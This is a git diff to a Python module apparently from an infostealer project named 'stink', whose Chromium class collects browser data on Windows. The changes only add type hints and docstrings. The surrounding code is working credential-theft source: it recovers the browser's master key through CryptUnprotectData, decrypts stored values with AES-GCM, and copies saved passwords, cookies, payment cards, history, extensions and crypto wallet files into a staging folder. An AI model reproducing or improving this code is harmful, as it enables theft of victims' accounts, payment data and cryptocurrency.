@@ -1,11 +1,12 @@
 from re import compile
-from sqlite3 import connect
+from typing import Tuple
 from shutil import copyfile
 from base64 import b64decode
 from json import load, loads, dump
 from distutils.dir_util import copy_tree
 from datetime import datetime, timedelta
 from os import path, makedirs, remove, listdir
+from sqlite3 import connect, Connection, Cursor
 from ctypes import windll, byref, cdll, c_buffer
 
 from stink.helpers import DataBlob
@@ -15,7 +16,9 @@ from stink.helpers.config import ChromiumConfig
 
 
 class Chromium:
-
+    """
+    Collects data from the browser.
+    """
     def __init__(self, browser_name: str, storage_path: str, state_path: str, browser_path: str, statuses: list, errors: bool):
 
         self.__browser_name = browser_name
@@ -29,8 +32,11 @@ class Chromium:
         self.__config = ChromiumConfig()
         self.__path = rf"{self.__storage_path}\Browsers\{self.__browser_name}"
 
-    def _get_profiles(self):
-
+    def _get_profiles(self) -> list:
+        """
+        Collects all browser profiles.
+        :return: list
+        """
         if self.__browser_path[-9:] in ["User Data"]:
 
             pattern = compile(r"Default|Profile \d+")
@@ -38,16 +44,24 @@ class Chromium:
 
         return [self.__browser_path]
 
-    def _check_paths(self):
-
+    def _check_paths(self) -> None:
+        """
+        Checks if a browser is installed and if data collection from it is enabled.
+        :return: None
+        """
         if path.exists(self.__browser_path) and any(self.__statuses):
 
             makedirs(rf"{self.__storage_path}\Browsers\{self.__browser_name}")
             self.__profiles = self._get_profiles()
 
     @staticmethod
-    def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy=b''):
-
+    def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy: bytes = b'') -> bytes:
+        """
+        Decrypts encrypted data.
+        :param encrypted_bytes: b64decode
+        :param entropy: bytes
+        :return: bytes
+        """
         blob = DataBlob()
 
         if windll.crypt32.CryptUnprotectData(byref(DataBlob(len(encrypted_bytes), c_buffer(encrypted_bytes, len(encrypted_bytes)))), None, byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))), None, None, 0x01, byref(blob)):
@@ -58,8 +72,11 @@ class Chromium:
 
             return buffer.raw
 
-    def _get_key(self):
-
+    def _get_key(self) -> bytes:
+        """
+        Gets the decryption key.
+        :return: bytes
+        """
         with open(self.__state_path, "r", encoding="utf-8") as state:
             file = state.read()
 
@@ -68,24 +85,37 @@ class Chromium:
         return self._crypt_unprotect_data(b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:])
 
     @staticmethod
-    def _get_datetime(date):
-
+    def _get_datetime(date: int) -> str:
+        """
+        Converts timestamp to date.
+        :param date: int
+        :return: str
+        """
         try:
             return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
         except:
             return "Can't decode"
 
     @staticmethod
-    def _decrypt(value: bytes, master_key: bytes = None):
-
+    def _decrypt(value: bytes, master_key: bytes = None) -> str:
+        """
+        Decrypts the value with the master key.
+        :param value: bytes
+        :param master_key: bytes
+        :return: str
+        """
         try:
             return AESModeOfOperationGCM(master_key, value[3:15]).decrypt(value[15:])[:-16].decode()
         except:
             return "Can't decode"
 
     @staticmethod
-    def _get_db_connection(database: str):
-
+    def _get_db_connection(database: str) -> Tuple[Cursor, Connection]:
+        """
+        Creates a connection with the database.
+        :param database: str
+        :return: (Cursor, Connection)
+        """
         with connect(database) as connection:
             connection.text_factory = lambda text: text.decode(errors="ignore")
             cursor = connection.cursor()
@@ -93,15 +123,26 @@ class Chromium:
         return cursor, connection
 
     @staticmethod
-    def _get_file(file_path: str):
-
+    def _get_file(file_path: str) -> str:
+        """
+        Reads the file contents.
+        :param file_path: str
+        :return: str
+        """
         with open(file_path, "r", encoding="utf-8") as file:
             data = file.read()
 
         return data
 
-    def _copy_files(self, storage_path: str, main_path: str, alt_path: str = None, error: str = ""):
-
+    def _copy_files(self, storage_path: str, main_path: str, alt_path: str = None, error: str = "") -> bool:
+        """
+        Copies the file/directory or prints an error if it is not found.
+        :param storage_path: str
+        :param main_path: str
+        :param alt_path: str
+        :param error: str
+        :return: bool
+        """
         if path.isfile(main_path) or (alt_path and path.isfile(alt_path)):
             copy = copyfile
         else:
@@ -119,8 +160,14 @@ class Chromium:
 
         return True
 
-    def _grab_passwords(self, profile: str, main_path: str, alt_path: str = None):
-
+    def _grab_passwords(self, profile: str, main_path: str, alt_path: str = None) -> None:
+        """
+        Collects browser passwords.
+        :param profile: str
+        :param main_path: str
+        :param alt_path: str
+        :return: None
+        """
         filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Passwords.db"
 
         if self._copy_files(filename, main_path, alt_path, "No passwords found") is False:
@@ -147,8 +194,14 @@ class Chromium:
 
         passwords.close()
 
-    def _grab_cookies(self, profile: str, main_path: str, alt_path: str = None):
-
+    def _grab_cookies(self, profile: str, main_path: str, alt_path: str = None) -> None:
+        """
+        Collects browser cookies.
+        :param profile: str
+        :param main_path: str
+        :param alt_path: str
+        :return: None
+        """
         filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Cookies.db"
 
         if self._copy_files(filename, main_path, alt_path, "No cookies found") is False:
@@ -193,8 +246,14 @@ class Chromium:
 
         cookies.close()
 
-    def _grab_cards(self, profile: str, main_path: str, alt_path: str = None):
-
+    def _grab_cards(self, profile: str, main_path: str, alt_path: str = None) -> None:
+        """
+        Collects browser cards.
+        :param profile: str
+        :param main_path: str
+        :param alt_path: str
+        :return: None
+        """
         filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Cards.db"
 
         if self._copy_files(filename, main_path, alt_path, "No cards found") is False:
@@ -221,8 +280,14 @@ class Chromium:
 
         cards.close()
 
-    def _grab_history(self, profile: str, main_path: str, alt_path: str = None):
-
+    def _grab_history(self, profile: str, main_path: str, alt_path: str = None) -> None:
+        """
+        Collects browser history.
+        :param profile: str
+        :param main_path: str
+        :param alt_path: str
+        :return: None
+        """
         filename = rf"{self.__storage_path}\{self.__browser_name} {profile} History.db"
 
         if self._copy_files(filename, main_path, alt_path, "No history found") is False:
@@ -250,8 +315,14 @@ class Chromium:
 
         history.close()
 
-    def _grab_bookmarks(self, profile: str, main_path: str, alt_path: str = None):
-
+    def _grab_bookmarks(self, profile: str, main_path: str, alt_path: str = None) -> None:
+        """
+        Collects browser bookmarks.
+        :param profile: str
+        :param main_path: str
+        :param alt_path: str
+        :return: None
+        """
         filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Bookmarks"
 
         if self._copy_files(filename, main_path, alt_path, "No bookmarks found") is False:
@@ -276,8 +347,13 @@ class Chromium:
 
         bookmarks.close()
 
-    def _grab_extensions(self, profile: str, extension: str):
-
+    def _grab_extensions(self, profile: str, extension: str) -> None:
+        """
+        Collects browser extensions.
+        :param profile: str
+        :param extension: str
+        :return: None
+        """
         extensions_list = []
         extensions_dirs = listdir(extension)
 
@@ -308,8 +384,13 @@ class Chromium:
 
         extensions.close()
 
-    def _grab_wallets(self, profile: str, wallets: str):
-
+    def _grab_wallets(self, profile: str, wallets: str) -> None:
+        """
+        Collects browser wallets.
+        :param profile: str
+        :param wallets: str
+        :return: None
+        """
         for wallet in self.__config.WalletLogs[self.__browser_name]:
 
             try:
@@ -320,8 +401,12 @@ class Chromium:
             except Exception as e:
                 if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
 
-    def _process_profile(self, profile: str):
-
+    def _process_profile(self, profile: str) -> None:
+        """
+        Collects browser profile data.
+        :param profile: str
+        :return: None
+        """
         profile_name = profile.replace("\\", "/").split("/")[-1]
         functions = [
             {
@@ -373,8 +458,11 @@ class Chromium:
             except Exception as e:
                 if self.__errors is True: print(f"[{self.__browser_name}]: {repr(e)}")
 
-    def _check_profiles(self):
-
+    def _check_profiles(self) -> None:
+        """
+        Collects data for each browser profile.
+        :return: None
+        """
         if not self.__profiles:
             if self.__errors is True: print(f"[{self.__browser_name}]: No profiles found")
             return
@@ -384,8 +472,11 @@ class Chromium:
         for profile in self.__profiles:
             self._process_profile(profile)
 
-    def run(self):
-
+    def run(self) -> None:
+        """
+        Launches the browser data collection module.
+        :return: None
+        """
         try:
 
             self._check_paths()
